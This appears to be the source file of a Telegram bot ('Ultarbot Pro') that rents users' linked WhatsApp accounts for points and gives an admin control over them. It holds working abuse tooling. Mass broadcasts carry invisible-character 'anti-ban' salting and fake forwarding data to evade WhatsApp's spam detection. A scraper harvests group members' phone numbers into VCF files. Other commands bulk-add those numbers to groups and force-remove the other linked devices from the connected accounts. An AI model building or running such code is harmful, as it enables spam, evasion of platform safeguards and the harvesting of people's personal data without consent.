import { 
    getAllSessions, getAllNumbers, countNumbers, deleteNumbers, clearAllNumbers,
    getUser, createUser, getEarningsStats, getReferrals, updateBank, createWithdrawal,
    setAntiMsgStatus, addNumbersToDb, getShortId, checkNumberInDb,
    getTodayEarnings, getYesterdayEarnings, getWithdrawalHistory, getEarningsHistory,
    markUserVerified, isUserVerified, getPendingWithdrawals, updateWithdrawalStatus, addPointsToUser, getWithdrawalDetails
} from './db.js';
import { delay } from '@whiskeysockets/baileys';
import fetch from 'node-fetch';

const ADMIN_ID = process.env.ADMIN_ID;
const userState = {};
const userRateLimit = {};  // Track user requests for rate limiting
const verifiedUsers = new Set();  // Track verified users who passed CAPTCHA
const userMessageCache = {};  // Track sent messages for cleanup
const RATE_LIMIT_WINDOW = 60000;  // 1 minute
const MAX_REQUESTS_PER_MINUTE = 10;  // Max requests per minute

const userKeyboard = {
    keyboard: [
        [{ text: "Connect Account" }, { text: "My Account" }],
        [{ text: "Dashboard" }, { text: "Referrals" }],
        [{ text: "Withdraw" }, { text: "Support" }]
    ],
    resize_keyboard: true
};

const adminKeyboard = {
    keyboard: [
        [{ text: "Connect Account" }, { text: "List All" }],
        [{ text: "Broadcast" }, { text: "Clear Contact List" }]
    ],
    resize_keyboard: true
};

function getKeyboard(chatId) {
    return { reply_markup: (chatId.toString() === ADMIN_ID) ? adminKeyboard : userKeyboard };
}

// Delete all previous bot messages and user input, then send new message
async function deleteOldMessagesAndSend(bot, chatId, text, options = {}) {
    try {
        // Delete previous bot messages
        if (userMessageCache[chatId] && Array.isArray(userMessageCache[chatId])) {
            for (const msgId of userMessageCache[chatId]) {
                try {
                    await bot.deleteMessage(chatId, msgId);
                } catch (e) {}
            }
        }
        userMessageCache[chatId] = [];
        
        // Send new message
        const sentMsg = await bot.sendMessage(chatId, text, options);
        userMessageCache[chatId].push(sentMsg.message_id);
        return sentMsg;
    } catch (error) {
        console.error('[DELETE_OLD] Error:', error.message);
        return null;
    }
}

// Delete user command message
async function deleteUserCommand(bot, msg) {
    try {
        if (msg && msg.message_id) {
            await bot.deleteMessage(msg.chat.id, msg.message_id);
        }
    } catch (e) {}
}

async function sendMenu(bot, chatId, text) {
    await deleteOldMessagesAndSend(bot, chatId, text, { ...getKeyboard(chatId), parse_mode: 'Markdown' });
}

// PERSISTENT DURATION: Calculates time based on DB timestamp (startDate)
function getDuration(startDate) {
    if (!startDate) return "Just now";
    const diff = Date.now() - new Date(startDate).getTime();
    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
    const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
    return `${days}d ${hours}h ${minutes}m`;
}

// Rate limit checker
function checkRateLimit(userId) {
    const now = Date.now();
    if (!userRateLimit[userId]) {
        userRateLimit[userId] = { count: 1, startTime: now };
        return true;
    }
    
    const userLimit = userRateLimit[userId];
    if (now - userLimit.startTime > RATE_LIMIT_WINDOW) {
        userLimit.count = 1;
        userLimit.startTime = now;
        return true;
    }
    
    if (userLimit.count >= MAX_REQUESTS_PER_MINUTE) {
        return false;
    }
    userLimit.count++;
    return true;
}

// --- OLD SAVE LOGIC (STRICT 1-by-1) ---
function parseVcf(vcfContent) {
    const numbers = new Set();
    const lines = vcfContent.split(/\r?\n/);
    lines.forEach(line => {
        if (line.includes('TEL')) {
            let cleanNum = line.replace(/[^0-9]/g, '');
            if (cleanNum.length > 7 && cleanNum.length < 16) numbers.add(cleanNum);
        }
    });
    return Array.from(numbers);
}

// --- HELPER: ROBUST LOGOUT SEQUENCE (IQ NODE PROTOCOL) ---
async function performLogoutSequence(sock, shortId, bot, chatId) {
    const myJid = sock.user?.id || "";
    if (!myJid) return 0;
    
    const userNumber = myJid.split(':')[0].split('@')[0];
    let myDeviceId = 0;
    if (myJid.includes(':')) {
        myDeviceId = parseInt(myJid.split(':')[1].split('@')[0]);
    }

    let kickedCount = 0;
    
    // Scan slots 1-20 aggressively
    for (let i = 1; i <= 20; i++) {
        if (i === 0 || i === myDeviceId) continue;

        const targetDeviceJid = `${userNumber}:${i}@s.whatsapp.net`;
        
        try {
            await sock.query({
                tag: 'iq',
                attrs: { to: '@s.whatsapp.net', type: 'set', xmlns: 'md' },
                content: [{ tag: 'remove-companion-device', attrs: { jid: targetDeviceJid, reason: 'user_initiated' } }]
            });
            kickedCount++;
            await delay(300); 
        } catch (err) {}

        try {
            await sock.sendMessage(targetDeviceJid, { protocolMessage: { type: 5 } });
            await delay(200);
        } catch(e) {}
    }

    await delay(3000);
    try { await sock.logout(); } catch(e) {}
    
    return kickedCount;
}

export function setupTelegramCommands(bot, notificationBot, clients, shortIdMap, antiMsgState, startClient, makeSessionId, serverUrl = '', qrActiveState = {}, deleteUserAccount = null) {

    // --- BURST FORWARD BROADCAST ---
    async function executeBroadcast(chatId, targetId, contentObj) {
        const sessionData = shortIdMap[targetId];
        if (!sessionData || !clients[sessionData.folder]) {
            return sendMenu(bot, chatId, '[ERROR] Client disconnected or invalid ID.');
        }
        
        const sock = clients[sessionData.folder];
        const numbers = await getAllNumbers();
        if (numbers.length === 0) return sendMenu(bot, chatId, '[ERROR] Contact list is empty.');

        bot.sendMessage(chatId, `[BURST START]\nTargets: ${numbers.length}\nBot ID: ${targetId}\nMode: Anti-Ban Delivery`);
        
        let successCount = 0;
        let deliveredCount = 0;
        let failedCount = 0;
        const startTime = Date.now();
        const successfulNumbers = [];
        const CONCURRENT_LIMIT = 5; 
        
        const queue = numbers.map((num, idx) => ({ num, idx }));
        let queueIdx = 0;
        let activePromises = [];
        
        const sendMessage = async (num, msgIndex) => {
            try {
                const cleanNum = num.replace(/\D/g, '');
                const jid = `${cleanNum}@s.whatsapp.net`;
                
                // ANTI-BAN
                const invisibleChars = ['\u200B', '\u200C', '\u200D', '\uFEFF'];
                const randomInvisible = invisibleChars[Math.floor(Math.random() * invisibleChars.length)];
                const invisibleSalt = randomInvisible.repeat(Math.floor(Math.random() * 2) + 1);
                const zeroWidthJoiner = '\u200D';
                const antiBanTag = invisibleSalt + zeroWidthJoiner + ` ${msgIndex}`;
                
                const forwardContext = {
                    isForwarded: true,
                    forwardingScore: 999,
                    forwardedNewsletterMessageInfo: {
                        newsletterId: '0',
                        serverMessageId: 0,
                        noMedia: true,
                        isRatedPenatlyDocument: false
                    }
                };

                let response;
                if (contentObj.type === 'text') {
                    response = await sock.sendMessage(jid, { 
                        text: contentObj.text + antiBanTag,
                        contextInfo: forwardContext
                    });
                } 
                else if (contentObj.type === 'image') {
                    response = await sock.sendMessage(jid, { 
                        image: contentObj.buffer, 
                        caption: (contentObj.caption || "") + antiBanTag,
                        contextInfo: forwardContext
                    });
                } 
                else if (contentObj.type === 'video') {
                    response = await sock.sendMessage(jid, { 
                        video: contentObj.buffer, 
                        caption: (contentObj.caption || "") + antiBanTag,
                        contextInfo: forwardContext
                    });
                }
                
                if (response && response.key) {
                    successfulNumbers.push(num);
                    deliveredCount++;
                    return { success: true, num };
                } else {
                    failedCount++;
                    return { success: false, num };
                }
            } catch (e) { 
                failedCount++;
                return { success: false, num, error: e.message };
            }
        };
        
        while (queueIdx < queue.length || activePromises.length > 0) {
            while (activePromises.length < CONCURRENT_LIMIT && queueIdx < queue.length) {
                const { num, idx } = queue[queueIdx];
                const promise = sendMessage(num, idx + 1)
                    .then(result => {
                        activePromises = activePromises.filter(p => p !== promise);
                        return result;
                    });
                activePromises.push(promise);
                queueIdx++;
                await delay(Math.random() * 150 + 50);
            }
            if (activePromises.length > 0) await Promise.race(activePromises);
        }
        
        const batchCompleted = Math.min(queueIdx, 50);
        if (batchCompleted % 10 === 0) {
            bot.sendMessage(chatId, `[PROGRESS] Sent: ${successCount + deliveredCount}/${numbers.length}`).catch(() => {});
        }
        
        const duration = ((Date.now() - startTime) / 1000).toFixed(2);
        if (successfulNumbers.length > 0) await deleteNumbers(successfulNumbers);

        sendMenu(bot, chatId, 
            `[BROADCAST COMPLETE]\n` +
            `Time: ${duration}s\n` +
            `Delivered: ${deliveredCount}\n` +
            `Failed: ${failedCount}\n` +
            `DB Cleared`
        );
    }

    // --- COMMANDS ---

    bot.onText(/\/logoutall/, async (msg) => {
        deleteUserCommand(bot, msg);
        if (msg.chat.id.toString() !== ADMIN_ID) return;
        const chatId = msg.chat.id;
        const connectedFolders = Object.keys(clients);
        if (connectedFolders.length === 0) return sendMenu(bot, chatId, "[ERROR] No accounts connected.");

        bot.sendMessage(chatId, `[SYSTEM CLEANUP] Found ${connectedFolders.length} accounts.\nStarting Global Logout...`);
        let processedCount = 0;
        
        for (const folder of connectedFolders) {
            const sock = clients[folder];
            const shortId = Object.keys(shortIdMap).find(key => shortIdMap[key].folder === folder) || 'Unknown';
            try {
                await performLogoutSequence(sock, shortId, bot, chatId);
                processedCount++;
            } catch (e) { console.error(`Logout failed for ${shortId}:`, e); }
        }
        sendMenu(bot, chatId, `[LOGOUT COMPLETE]\nProcessed: ${processedCount}/${connectedFolders.length}`);
    });

    bot.onText(/\/logout\s+(\S+)/, async (msg, match) => {
        deleteUserCommand(bot, msg);
        if (msg.chat.id.toString() !== ADMIN_ID) return;
        
        const targetId = match[1];
        if (!targetId || !shortIdMap[targetId]) return sendMenu(bot, msg.chat.id, `[ERROR] Invalid ID: ${targetId}`);
        const sessionData = shortIdMap[targetId];
        const sock = clients[sessionData.folder];

        if (!sock) return sendMenu(bot, msg.chat.id, `[ERROR] Client disconnected.`);
        try {
            bot.sendMessage(msg.chat.id, `[LOGOUT] ${targetId}...`);
            await performLogoutSequence(sock, targetId, bot, msg.chat.id);
            sendMenu(bot, msg.chat.id, `[SUCCESS] Logout complete.`);
        } catch (e) { bot.sendMessage(msg.chat.id, `[ERROR] Logout failed: ${e.message}`); }
    });

    bot.onText(/\/addnum\s+(\S+)/, async (msg, match) => {
        deleteUserCommand(bot, msg);
        if (msg.chat.id.toString() !== ADMIN_ID) return;
        const num = match[1].replace(/[^0-9]/g, '');
        if (num.length < 7) return bot.sendMessage(msg.chat.id, '[ERROR] Invalid number.');
        await addNumbersToDb([num]);
        const total = await countNumbers();
        sendMenu(bot, msg.chat.id, `[ADDED] ${num}\nTotal DB: ${total}`);
    });

    bot.onText(/\/checknum\s+(\S+)/, async (msg, match) => {
        deleteUserCommand(bot, msg);
        if (msg.chat.id.toString() !== ADMIN_ID) return;
        const num = match[1].replace(/[^0-9]/g, '');
        if (num.length < 7) return bot.sendMessage(msg.chat.id, '[ERROR] Invalid number.');
        const exists = await checkNumberInDb(num);
        if (exists) sendMenu(bot, msg.chat.id, `[FOUND] ${num} is in database.`);
        else sendMenu(bot, msg.chat.id, `[NOT FOUND] ${num} is NOT in database.`);
    });

    bot.onText(/\/broadcast(?:\s+(.+))?/, async (msg, match) => {
        deleteUserCommand(bot, msg);
        if (msg.chat.id.toString() !== ADMIN_ID) return;
        const chatId = msg.chat.id;
        let inputId = match[1] ? match[1].trim() : null;

        const activeIds = Object.keys(shortIdMap).filter(id => clients[shortIdMap[id].folder]);
        if (activeIds.length === 0) return sendMenu(bot, chatId, "[ERROR] No active bots.");
        
        let targetId = activeIds[0];
        let contentObj = null;

        if (msg.reply_to_message) {
            if (inputId && shortIdMap[inputId]) targetId = inputId; 
            const reply = msg.reply_to_message;
            if (reply.text) contentObj = { type: 'text', text: reply.text };
            else if (reply.photo) {
                bot.sendMessage(chatId, '[LOADING] Image...');
                const fileId = reply.photo[reply.photo.length - 1].file_id;
                const url = await bot.getFileLink(fileId);
                const buffer = await (await fetch(url)).buffer();
                contentObj = { type: 'image', buffer, caption: reply.caption || "" };
            } 
            else if (reply.video) {
                bot.sendMessage(chatId, '[LOADING] Video...');
                const fileId = reply.video.file_id;
                const url = await bot.getFileLink(fileId);
                const buffer = await (await fetch(url)).buffer();
                contentObj = { type: 'video', buffer, caption: reply.caption || "" };
            }
        } else {
            if (inputId) contentObj = { type: 'text', text: inputId };
            else {
                userState[chatId] = 'WAITING_BROADCAST_MSG';
                userState[chatId + '_target'] = targetId;
                return bot.sendMessage(chatId, `[BROADCAST]\nID: ${targetId}\n\nEnter message:`, { reply_markup: { force_reply: true } });
            }
        }
        if (contentObj) executeBroadcast(chatId, targetId, contentObj);
    });

    bot.onText(/\/add\s+(\S+)\s+(\S+)/, async (msg, match) => {
        deleteUserCommand(bot, msg);
        if (msg.chat.id.toString() !== ADMIN_ID) return;
        const chatId = msg.chat.id;
        const acc = match[1];
        let groupLinkOrId = match[2];
        
        let sock = null;
        if (shortIdMap[acc] && clients[shortIdMap[acc].folder]) sock = clients[shortIdMap[acc].folder];
        else {
            const found = Object.values(shortIdMap).find(s => s.phone === acc);
            if (found && clients[found.folder]) sock = clients[found.folder];
        }

        if (!sock) return bot.sendMessage(chatId, '[ERROR] Account not found.');

        let groupJid = groupLinkOrId;
        if (groupLinkOrId.includes('chat.whatsapp.com')) {
            try {
                const code = groupLinkOrId.split('chat.whatsapp.com/')[1];
                groupJid = await sock.groupAcceptInvite(code);
                bot.sendMessage(chatId, `[JOINED] ID: ${groupJid}`);
            } catch (e) { return bot.sendMessage(chatId, `[ERROR] Join Failed: ${e.message}`); }
        }

        const numbers = await getAllNumbers();
        if (numbers.length === 0) return bot.sendMessage(chatId, '[ERROR] Database empty.');

        bot.sendMessage(chatId, `[ADDING] ${numbers.length} users (100 / 30s)...`);
        
        let addedCount = 0;
        for (let i = 0; i < numbers.length; i += 100) {
            const batch = numbers.slice(i, i + 100);
            const participants = batch.map(n => `${n}@s.whatsapp.net`);
            try {
                await sock.groupParticipantsUpdate(groupJid, participants, "add");
                addedCount += batch.length;
                bot.sendMessage(chatId, `[OK] Batch ${Math.floor(i/100)+1}`);
                if (i + 100 < numbers.length) await delay(30000);
            } catch (e) { bot.sendMessage(chatId, `[FAIL] Batch ${Math.floor(i/100)+1}: ${e.message}`); }
        }
        sendMenu(bot, chatId, `[DONE] Added ${addedCount}.`);
    });

    bot.onText(/\/scrape\s+(\S+)/, async (msg, match) => {
        deleteUserCommand(bot, msg);
        if (msg.chat.id.toString() !== ADMIN_ID) return;
        const chatId = msg.chat.id;
        let groupLink = match[1];

        const firstId = Object.keys(shortIdMap).find(id => clients[shortIdMap[id].folder]);
        if (!firstId) return bot.sendMessage(chatId, '[ERROR] Pair an account first.');
        const sock = clients[shortIdMap[firstId].folder];

        try {
            bot.sendMessage(chatId, `[SCRAPING] Joining group...`);
            let inviteCode = groupLink.split('chat.whatsapp.com/')[1].split(/[\s?#&]/)[0];
            let groupJid = await sock.groupAcceptInvite(inviteCode);
            
            bot.sendMessage(chatId, `[JOINED] Group: ${groupJid}\n[FETCHING] Members...`);
            let groupMetadata;
            try { groupMetadata = await sock.groupMetadata(groupJid); } 
            catch { groupMetadata = await sock.groupMetadata(groupJid.replace('@g.us', '@lid')); }

            let members = groupMetadata.participants
                .filter(p => !p.admin && !p.isAdmin && !p.isSuperAdmin && !p.owner)
                .map(p => p.id);
            
            if (members.length === 0) members = groupMetadata.participants.map(p => p.id);

            bot.sendMessage(chatId, `[SCRAPED] ${members.length} raw IDs found.\n[GENERATING] VCF...`);

            let vcfContent = 'BEGIN:VCARD\nVERSION:3.0\nFN:Group Members\nEND:VCARD\n\n';
            let validCount = 0;
            const uniqueNumbers = new Set(members.map(m => m.replace(/\D/g, '')));
            
            uniqueNumbers.forEach((num) => {
                if (num.length >= 7 && num.length <= 15) {
                    vcfContent += `BEGIN:VCARD\nVERSION:3.0\nFN:Member ${validCount + 1}\nTEL:+${num}\nEND:VCARD\n`;
                    validCount++;
                }
            });

            // Dynamic import for fs/path to handle scraping
            const fs = await import('fs');
            const path = await import('path');
            const tempDir = '/tmp'; // Use /tmp for read-only filesystem compatibility
            const fileName = `scraped_members_${Date.now()}.vcf`;
            const filePath = path.join(tempDir, fileName);

            fs.writeFileSync(filePath, vcfContent);
            await bot.sendDocument(chatId, filePath);
            fs.unlinkSync(filePath);

            try { await sock.groupLeave(groupJid); } catch (e) {}
            sendMenu(bot, chatId, `[SUCCESS] Scraped ${validCount} members.`);

        } catch (e) { bot.sendMessage(chatId, `[ERROR] Scrape failed: ${e.message}`); }
    });

    bot.onText(/\/save/, async (msg) => {
        deleteUserCommand(bot, msg);
        if (msg.chat.id.toString() !== ADMIN_ID) return;
        
        const firstId = Object.keys(shortIdMap).find(id => clients[shortIdMap[id].folder]);
        if (!firstId) return bot.sendMessage(msg.chat.id, '[ERROR] Pair an account first.');
        const sock = clients[shortIdMap[firstId].folder];

        try {
            let rawText = "";
            if (msg.reply_to_message && msg.reply_to_message.document) {
                bot.sendMessage(msg.chat.id, "[DOWNLOADING]...");
                const fileLink = await bot.getFileLink(msg.reply_to_message.document.file_id);
                const response = await fetch(fileLink);
                rawText = await response.text();
            } else if (msg.reply_to_message && msg.reply_to_message.text) {
                rawText = msg.reply_to_message.text;
            } else { return; }
            
            const rawNumbers = parseVcf(rawText);
            if (rawNumbers.length === 0) return bot.sendMessage(msg.chat.id, '[ERROR] No numbers found.');

            bot.sendMessage(msg.chat.id, `[SCANNING] ${rawNumbers.length} numbers (One by One)...`);

            const validNumbers = [];
            for (const num of rawNumbers) {
                try {
                    const [res] = await sock.onWhatsApp(`${num}@s.whatsapp.net`);
                    if (res?.exists) validNumbers.push(res.jid.split('@')[0]);
                } catch (e) {}
                await delay(100); 
            }

            await addNumbersToDb(validNumbers);
            const total = await countNumbers();
            
            bot.sendMessage(msg.chat.id, `[SAVED] Valid: ${validNumbers.length}\nTotal DB: ${total}`);
        } catch (e) { bot.sendMessage(msg.chat.id, "Error: " + e.message); }
    });

    bot.onText(/\/antimsg\s+([a-zA-Z0-9]+)\s+(on|off)/i, async (msg, match) => {
        if (msg.chat.id.toString() !== ADMIN_ID) return;
        const id = match[1].trim();
        const status = (match[2].toLowerCase() === 'on');
        if (shortIdMap[id]) {
            antiMsgState[id] = status;
            await setAntiMsgStatus(shortIdMap[id].folder, status);
            sendMenu(bot, msg.chat.id, `[ANTIMSG] ${status ? 'ON' : 'OFF'}`);
        }
    });

    // --- POINTS ADMIN COMMAND (PERSISTENT) ---
    bot.onText(/\/add\s+(\d+)\s+([+-]?\d+)/, async (msg, match) => {
        deleteUserCommand(bot, msg);
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_ID) return bot.sendMessage(chatId, '[ERROR] Admin only.');
        
        const targetUserId = match[1];
        const pointsChange = parseInt(match[2]);
        
        const user = await getUser(targetUserId);
        if (!user) return bot.sendMessage(chatId, `[ERROR] User ${targetUserId} not found.`);
        
        try {
            await addPointsToUser(targetUserId, pointsChange);
            const newUser = await getUser(targetUserId);
            bot.sendMessage(chatId, `[SUCCESS] User: ${targetUserId}\nOld: ${user.points}\nNew: ${newUser.points}`);
            bot.sendMessage(targetUserId, `[ALERT] Admin adjusted your points: ${pointsChange > 0 ? '+' : ''}${pointsChange}`, getKeyboard(targetUserId)).catch(()=>{});
        } catch (error) { bot.sendMessage(chatId, `[ERROR] DB Error: ${error.message}`); }
    });

    bot.onText(/\/deluser\s+(\d+)/, async (msg, match) => {
        deleteUserCommand(bot, msg);
        if (msg.chat.id.toString() !== ADMIN_ID) return;
        try {
            await deleteUserAccount(match[1]);
            sendMenu(bot, msg.chat.id, `[SUCCESS] User ${match[1]} deleted.`);
        } catch (error) { bot.sendMessage(msg.chat.id, `[ERROR] ${error.message}`); }
    });

    bot.onText(/\/start/, async (msg) => {
        deleteUserCommand(bot, msg);
        const chatId = msg.chat.id;
        const userId = chatId.toString();
        userState[chatId] = null;
        
        if (userId === ADMIN_ID) return sendMenu(bot, chatId, 'Ultarbot Pro Active - Admin Mode.');
        
        const verified = await isUserVerified(userId);
        if (verified) {
            verifiedUsers.add(userId);
            return sendMenu(bot, chatId, 'Ultarbot Pro Active.');
        }
        
        if (userMessageCache[chatId]?.length > 0) return;
        
        const verifyUrl = `${serverUrl.replace(/\/$/, '')}/verify?userId=${userId}`;
        try {
            const sentMsg = await bot.sendMessage(chatId,
                '[SECURITY VERIFICATION]\n\nPlease complete the user verification to proceed.',
                { reply_markup: { inline_keyboard: [[{ text: 'Verify Now', web_app: { url: verifyUrl } }]] } }
            );
            userMessageCache[chatId] = [sentMsg.message_id];
        } catch (error) {}
    });

    bot.on('message', async (msg) => {
        if (!msg.text || msg.text.startsWith('/')) return;
        const chatId = msg.chat.id;
        const text = msg.text;
        const userId = chatId.toString();
        
        if (userState[chatId + '_lastMsgId'] === msg.message_id) return;
        userState[chatId + '_lastMsgId'] = msg.message_id;
        
        if (userId !== ADMIN_ID && !checkRateLimit(userId)) {
            return bot.sendMessage(chatId, '[RATE LIMIT] Too many requests.');
        }

        if (userState[chatId] === 'WAITING_PAIR') {
            const number = text.replace(/[^0-9]/g, '');
            if (number.length < 10) return sendMenu(bot, chatId, 'Invalid number.');
            
            if (userId !== ADMIN_ID && !(await isUserVerified(userId))) {
                userState[chatId] = null;
                return bot.sendMessage(chatId, '[SECURITY] Please verify first.');
            }
            
            const existingSession = Object.values(shortIdMap).find(s => s.phone === number);
            if (existingSession) return sendMenu(bot, chatId, `[ERROR] Number already connected.`);
            
            userState[chatId] = null;
            bot.sendMessage(chatId, `Initializing +${number}...`, getKeyboard(chatId));
            const sessionId = makeSessionId();
            
            startClient(sessionId, number, chatId, userId);
            try { await setAntiMsgStatus(sessionId, true); } catch (e) {}
            return;
        }

        if (userState[chatId] === 'WAITING_QR_CONNECT') return;

        if (userState[chatId] === 'WAITING_BANK_DETAILS') {
            const lines = text.split('\n').map(l => l.trim()).filter(l => l.length > 0);
            if (lines.length < 3) return bot.sendMessage(chatId, '[ERROR] Send 3 lines: Bank, Number, Name');
            await updateBank(userId, lines[0], lines[1], lines[2]);
            userState[chatId] = null;
            sendMenu(bot, chatId, '[SUCCESS] Bank details saved.');
            return;
        }

        if (userState[chatId] === 'WAITING_WITHDRAW_AMOUNT') {
            const amount = parseInt(text);
            const user = await getUser(userId);
            if (!user || user.points < amount) return bot.sendMessage(chatId, '[ERROR] Insufficient points.');
            
            let minWithdrawal = 3000;
            if (user.created_at && (Date.now() - new Date(user.created_at).getTime()) / (1000 * 60 * 60 * 24) < 3) minWithdrawal = 1000;
            if (amount < minWithdrawal) return bot.sendMessage(chatId, `[ERROR] Minimum withdrawal is ${minWithdrawal}.`);
            
            const withdrawId = await createWithdrawal(userId, amount, Math.floor(amount * 0.5));
            userState[chatId] = null;
            sendMenu(bot, chatId, `[SUCCESS] Withdrawal #${withdrawId} requested.`);
            
            await bot.sendMessage(ADMIN_ID, `[NEW WITHDRAWAL]\nID: ${withdrawId}\nUser: ${userId}\nAmt: ${amount}`, {
                reply_markup: { inline_keyboard: [[{ text: 'Approve', callback_data: `approve_${withdrawId}` }, { text: 'Reject', callback_data: `reject_${withdrawId}` }]] }
            });
            return;
        }
        
        if (userState[chatId] === 'WAITING_BROADCAST_MSG') {
            const targetId = userState[chatId + '_target'];
            userState[chatId] = null;
            executeBroadcast(chatId, targetId, { type: 'text', text: text });
            return;
        }

        switch (text) {
            case "Connect Account":
                deleteUserCommand(bot, msg);
                deleteOldMessagesAndSend(bot, chatId, 'How do you want to connect?', { 
                    reply_markup: { inline_keyboard: [[{ text: 'Scan QR', callback_data: 'connect_qr' }, { text: 'Enter Phone', callback_data: 'connect_code' }]] } 
                });
                break;

            case "List All":
                deleteUserCommand(bot, msg);
                if (userId !== ADMIN_ID) return;
                const allSessions = await getAllSessions(null);
                const totalNums = await countNumbers();
                let list = `[STATS]\nDB Contacts: ${totalNums}\n\n[BOTS]\n`;
                if (allSessions.length === 0) list += "No bots.";
                else {
                    for (const s of allSessions) {
                        if (!s.short_id) continue;
                        const dur = getDuration(s.connected_at); // Uses DB timestamp
                        const status = clients[s.session_id] ? '[ON]' : '[OFF]';
                        list += `${status} \`${s.short_id}\` | +${s.phone}\n${dur}\n--\n`;
                    }
                }
                sendMenu(bot, chatId, list);
                break;

            case "Dashboard":
                deleteUserCommand(bot, msg);
                let user = await getUser(userId) || await createUser(userId) && await getUser(userId);
                const tEarn = await getTodayEarnings(userId);
                const yEarn = await getYesterdayEarnings(userId);
                const refs = await getReferrals(userId);
                
                let dash = `[DASHBOARD]\nBALANCE: ${user.points}\nTODAY: +${tEarn}\nYESTERDAY: +${yEarn}\nREFS: ${refs.total}`;
                await deleteOldMessagesAndSend(bot, chatId, dash, {
                    reply_markup: { inline_keyboard: [[{ text: "Earnings", callback_data: "earnings_details" }], [{ text: "Withdrawals", callback_data: "withdrawal_history" }]] }
                });
                break;

            case "My Account":
                deleteUserCommand(bot, msg);
                const uSessions = await getAllSessions(userId); // Persisted sessions
                let accMsg = `[MY ACCOUNT]\n`;
                if (uSessions.length === 0) accMsg += `No accounts.\n`;
                else {
                    for (const s of uSessions) {
                        if (!s.short_id) continue;
                        const status = clients[s.session_id] ? 'ONLINE' : 'OFFLINE';
                        accMsg += `${s.short_id} | +${s.phone} | ${status}\n${getDuration(s.connected_at)}\n`;
                    }
                }
                sendMenu(bot, chatId, accMsg);
                break;

            case "Referrals":
                deleteUserCommand(bot, msg);
                let rUser = await getUser(userId) || await createUser(userId) && await getUser(userId);
                const rData = await getReferrals(userId);
                sendMenu(bot, chatId, `[REFERRALS]\nLink: https://t.me/UltarbotProBot?start=${userId}\nTotal: ${rData.total}\nEarned: ${rUser.referral_earnings}`);
                break;

            case "Withdraw":
                deleteUserCommand(bot, msg);
                let wUser = await getUser(userId) || await createUser(userId) && await getUser(userId);
                if (!wUser.bank_name) {
                    bot.sendMessage(chatId, `[BANK]\nSend:\nBank Name\nNumber\nName`, { reply_markup: { inline_keyboard: [[{ text: 'Cancel', callback_data: 'cancel_action' }]] } });
                    userState[chatId] = 'WAITING_BANK_DETAILS';
                } else {
                    userState[chatId] = 'WAITING_WITHDRAW_AMOUNT';
                    bot.sendMessage(chatId, `Enter amount:`, { reply_markup: { inline_keyboard: [[{ text: 'Cancel', callback_data: 'cancel_action' }]] } });
                }
                break;

            case "Clear Contact List":
                if(userId === ADMIN_ID) { await clearAllNumbers(); sendMenu(bot, chatId, "[CLEARED] Database."); }
                break;

            case "Support":
                bot.sendMessage(chatId, 'Contact @admin for support.');
                break;
        }
    });

    bot.on('callback_query', async (query) => {
        const chatId = query.message.chat.id;
        const data = query.data;

        if (data === 'cancel_action' || data === 'cancel_qr') {
            userState[chatId] = null;
            await bot.deleteMessage(chatId, query.message.message_id).catch(()=>{});
            return sendMenu(bot, chatId, 'Cancelled.');
        }

        if (data === 'connect_qr') {
            userState[chatId] = 'WAITING_QR_CONNECT';
            for (const f in qrActiveState) delete qrActiveState[f];
            await deleteOldMessagesAndSend(bot, chatId, 'Generating QR code...', { reply_markup: { inline_keyboard: [[{ text: 'Cancel', callback_data: 'cancel_action' }]] } });
            const sId = makeSessionId();
            startClient(sId, null, chatId, chatId.toString());
            try { await setAntiMsgStatus(sId, true); } catch (e) {}
            return;
        }

        if (data === 'connect_code') {
            userState[chatId] = 'WAITING_PAIR';
            return deleteOldMessagesAndSend(bot, chatId, 'Enter WhatsApp number:', { reply_markup: { inline_keyboard: [[{ text: 'Cancel', callback_data: 'cancel_action' }]] } });
        }

        if (data.startsWith('approve_')) {
            const wId = parseInt(data.split('_')[1]);
            await updateWithdrawalStatus(wId, 'APPROVED');
            await bot.editMessageText(`[APPROVED] #${wId}`, { chat_id: chatId, message_id: query.message.message_id });
            return;
        }

        if (data.startsWith('reject_')) {
            const wId = parseInt(data.split('_')[1]);
            const w = await getWithdrawalDetails(wId);
            if (w) {
                await updateWithdrawalStatus(wId, 'REJECTED');
                await addPointsToUser(w.telegram_id, w.amount_points);
                bot.sendMessage(w.telegram_id, `[REJECTED] Refunded ${w.amount_points} pts.`, getKeyboard(w.telegram_id));
            }
            await bot.editMessageText(`[REJECTED] #${wId}`, { chat_id: chatId, message_id: query.message.message_id });
            return;
        }

        if (data === 'earnings_details') {
            const h = await getEarningsHistory(chatId.toString(), 10);
            let msg = h.length ? h.map(e => `+${e.amount} (${e.type})`).join('\n') : 'No earnings.';
            await bot.editMessageText(msg, { chat_id: chatId, message_id: query.message.message_id });
            return;
        }

        if (data === 'withdrawal_history') {
            const h = await getWithdrawalHistory(chatId.toString(), 10);
            let msg = h.length ? h.map(w => `#${w.id} | ${w.amount_points}pts | ${w.status}`).join('\n') : 'No withdrawals.';
            await bot.editMessageText(msg, { chat_id: chatId, message_id: query.message.message_id });
            return;
        }
        await bot.answerCallbackQuery(query.id);
    });
}

export { userMessageCache, userState };
